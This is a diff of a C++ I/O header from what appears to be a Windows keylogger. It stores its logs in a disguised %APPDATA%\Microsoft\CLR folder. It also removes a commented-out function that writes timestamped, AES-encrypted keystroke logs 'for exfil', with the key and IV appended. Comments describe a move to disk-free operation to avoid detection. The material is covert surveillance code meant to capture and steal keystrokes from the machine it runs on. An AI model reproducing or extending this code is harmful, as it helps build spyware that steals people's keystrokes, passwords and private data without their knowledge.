@@ -8,35 +8,54 @@
 #include "Auxiliary.h"
 #include "Transformer.h"
 
-using std::cout;
+/*
 
-//We will use this IO system to create files, store logs, deal with paths, etc...
+This header file will include the functionality used to interact with the targets filesystem and assist
+in the discovery of paths and the creation of files as well as writing to them
+
+*/
+
+using std::cout;
 
 namespace IO
 {
 
-	//This function uses stdlib to query the windows env variables and retrieves the path to the AppData folder
+	// Method prototypes for improved readability
 
-	std::string getAppDataPath(const bool appendSeperator = false)
+	std::string getAppDataPath(const bool appendSeperator = false);
+	bool createDirectory(std::string dirPath);
+
+	// This function uses stdlib to query the windows env variables and retrieves the path to the AppData folder
+
+	std::string getAppDataPath(const bool appendSeperator)
 	{
 		std::string appdataDir = getenv("APPDATA");
 		std::string fullPath = appdataDir + "\\Microsoft\\CLR";
 		return fullPath + (appendSeperator ? "\\" : "");
 	}
 
-	//The function below will create a new directory within wich we will store our logs
+	// The function below will create a new directory within wich we will store our logs
 
 	bool createDirectory(std::string dirPath)
 	{
-		/* All this mumbo jumbo to convert the string object passed in 
-		into a LPCWSTR which the WinAPI function accepts. */
+		/* 
+		
+		All this mumbo jumbo to convert the string object passed in 
+		into a LPCWSTR which the WinAPI function accepts
+		
+		*/
 
 		std::wstring tmp = std::wstring(dirPath.begin(), dirPath.end());
 		LPCWSTR dirPath2 = tmp.c_str();
 
-		/* This if funnel simply deals with the result of trying to create a directory. If it is successful,
-		then return true, if the target directory already exists, then also return true, however, if the target
-		path could not be located, then return false. */
+		/* 
+		
+		This if funnel simply deals with the result of trying to create a directory
+		
+		If it is successful, then return true, if the target directory already exists, 
+		then also return true, however, if the target path could not be located, then return false
+		
+		*/
 
 		if (CreateDirectory(dirPath2, NULL) == 0)
 		{
@@ -54,67 +73,6 @@ namespace IO
 			return false;
 		}
 	}
-
-	//The writeToLog function has been temp disabled to facilitate the transition to disk-free operation
-
-	//Below is a template function which will take inputs and write it to our key log file for exfil
-
-	/*template <typename T1>
-	std::string writeToLog(const T1 &input)
-	{
-
-		//First, we get our path for the AppData folder
-		std::string writePath = getAppDataPath(true);
-
-		//We create a structure for the current date and time to use in the filename
-		Auxiliary::DateTime dateTime;
-		
-		//We construct a filename with the date, time, and proper extension and seperators
-		std::string logName = dateTime.getDTString(".", "-", "_") + ".log";
-
-		//We now make a full file path using both the log name and the write path
-		std::string filePath = writePath + logName;
-
-		//Beginning of file creation and insertion process
-		try
-		{
-			//Create a file object and open it in the correct location with proper permissions
-			std::ofstream keyLog;
-			keyLog.open(filePath, std::ios::app);
-			
-			//If log file could not be created for some reason, return empty string
-			if (!keyLog.is_open())
-			{
-				Auxiliary::logError("writeToLog() - Could not create log file!");
-			}
-			else
-			{
-				std::ostringstream outputStream;
-
-				//Insert given data and timestamps to stream
-				outputStream << "[" << dateTime.getDTString("/", " ", ":") << "]" << std::endl << input << std::endl;
-
-				//Encrypy that data with AES-256
-				std::string insertData = Transformer::aesEncrypt(outputStream.str());
-
-				//Need to figure out how to securley transmit the key along with the log content
-				insertData +=  "\n\nkey: " + Transformer::getEncryptionKey();
-				insertData += "\niv: " + Transformer::getIV();
-
-				//Write that data into the file
-				keyLog << insertData;
-			}
-
-			//Close the file and return the path to the log
-
-			keyLog.close();
-			return filePath;
-		}
-		catch(...)
-		{
-			//Do nothing...
-		}
-	}*/
 }
 
 #endif // !IO_H
